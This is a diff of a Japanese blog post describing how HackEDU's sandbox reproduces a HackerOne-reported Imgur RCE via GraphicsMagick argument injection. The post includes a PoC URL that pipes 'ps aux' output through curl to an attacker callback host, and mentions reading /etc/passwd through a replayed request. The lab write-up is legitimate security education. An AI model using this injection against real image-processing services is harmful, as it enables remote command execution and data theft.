@@ -1,8 +1,3 @@
-
-
-
-
-
 # HackerOneに報告された脆弱性をHackEDUで再現する
 
 サイバーセキュリティに関する体験型学習サービスを提供する「[HackEDU](https://hackedu.io/)」が[HackerOneと提携し、過去に報告された脆弱性を再現できるサンドボックス環境をリリースした](https://www.hackerone.com/blog/Test-your-hacking-skills-real-world-simulated-bugs)。
@@ -14,17 +9,17 @@ HackEDUの無料アカウントを作成するだけで、HackerOneに報告さ�
 
 HackEDUの利用者はブラウザからサンドボックス環境にアクセスし、ページ内に用意された仮想ブラウザと仮想プロキシを使って脆弱性を再現する。以下のページが[ImgurでのRCEのサンドボックス環境](https://hackedu.io/hacktivity/5f8e247b-98bc-4b7a-aa97-472dcc34a6f8)である。仮想ブラウザ上の1つ目のタブにImgurを再現したImgerというサイトが、2つ目にコールバックを確認するためのタブが開かれている。
 
-![top](https://user-images.githubusercontent.com/5434303/53991342-baa30f80-416d-11e9-8882-70e33c8bccb8.png)
+![top](/assets/2019/hackedu/top.png)
 
 neex氏のレポートによると脆弱性は画像編集機能で見つかっている。Imgurでは画像処理ツールとして人気の高いImageMagickとGraphicsMagickのどちらかが利用されているとneex氏は推測し、どちらのツールにも存在する `-rotate` オプションを用いて調査を始めている。
 
 サンドボックス環境では画像編集時のHTTPリクエストがPOSTメソッドで送られるが、GETメソッドに変更しても問題なく処理される。今回はレポートを忠実に再現するため、仮想プロキシでインターセプトしたHTTPリクエストをGETメソッドに変更した上でパラメータの値を書き換える。
 
-![intercept](https://user-images.githubusercontent.com/5434303/53991381-cdb5df80-416d-11e9-8666-90a50c8471fc.png)
+![intercept](/assets/2019/hackedu/intercept.png)
 
 Imgurでは画像編集時に送信される `y` パラメータの値を画像処理ツールのコマンドライン引数に挿入していたため脆弱性が生じた。サンドボックス環境でも `y` パラメータの値に ` -rotate 90` を追加すると画像が90度回転する。
 
-![rotate](https://user-images.githubusercontent.com/5434303/53991406-de665580-416d-11e9-9901-3921ed52caa3.png)
+![rotate](/assets/2019/hackedu/rotate.png)
 
 さらなる調査の結果、ImgurではGraphicsMagickが利用されているとneex氏は確信し、`-write` オプションで任意のコマンドを実行できる仕様を用いてRCEを実証した<sup id="f1">[1](#fn1)</sup>。PoCでは `y` パラメータから挿入した `ps` コマンドの実行結果を `curl` コマンドで外部のサーバーへ送信している。
 
@@ -32,7 +27,7 @@ Imgurでは画像編集時に送信される `y` パラメータの値を画像�
 
 http:<span>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&a=crop&x=95&y=41%20-write%20|ps${IFS}aux|curl${IFS}http:<span>//attacker-callback.com:9000${IFS}-d${IFS}@-&w=768&h=328&random=asdf
 
-![callback](https://user-images.githubusercontent.com/5434303/53991423-ec1bdb00-416d-11e9-8345-4de5bbc8f3b2.png)
+![callback](/assets/2019/hackedu/callback.png)
 
 ## HackEDUでのHTTPリクエストの再送
 
@@ -40,7 +35,7 @@ http:<span>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg
 
 サンドボックス環境とはいえ仮想ブラウザから発生するHTTPリクエストはHackEDUのサーバーに送信される。そのためサンドボックス環境のページを開いているブラウザでローカルプロキシを経由すればHTTPリクエストを操作できる。例えばBurp SuiteのRepeaterで以下のHTTPリクエストを再送すると、仮想ブラウザの2つ目のタブに `/etc/passwd` の内容が表示される。
 
-![burp](https://user-images.githubusercontent.com/5434303/53991456-fb9b2400-416d-11e9-9a44-c8165269a667.png)
+![burp](/assets/2019/hackedu/burp.png)
 
 ## 所感
 
